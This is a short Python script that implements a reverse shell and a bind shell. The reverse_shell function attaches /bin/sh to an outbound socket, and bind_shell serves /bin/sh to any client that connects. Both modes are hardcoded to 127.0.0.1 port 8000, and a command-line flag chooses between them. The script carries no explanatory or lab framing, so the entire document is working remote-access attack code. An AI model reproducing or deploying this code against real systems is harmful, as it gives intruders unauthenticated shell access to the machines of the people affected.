import argparse
import socket
import subprocess

def reverse_shell(network, address, shell):
    try:
        c = socket.create_connection((network, address))
        subprocess.run(shell, stdin=c, stdout=c, stderr=c)
    except Exception as e:
        print(e)

def bind_shell(network, address, shell):
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((network, address))
        server.listen(1)

        print(f"[*] Listening on {network}:{address}")

        while True:
            conn, addr = server.accept()
            print(f"[*] Accepted connection from {addr}")

            subprocess.Popen(shell, stdin=conn, stdout=conn, stderr=conn)

    except Exception as e:
        print(e)

def main():
    parser = argparse.ArgumentParser(description="Reverse or bind shell")
    parser.add_argument("-r", "--reverse", action="store_true", help="Use reverse shell")

    args = parser.parse_args()

    if args.reverse:
        reverse_shell("127.0.0.1", 8000, "/bin/sh")
    else:
        bind_shell("127.0.0.1", 8000, "/bin/sh")

if __name__ == "__main__":
    main()
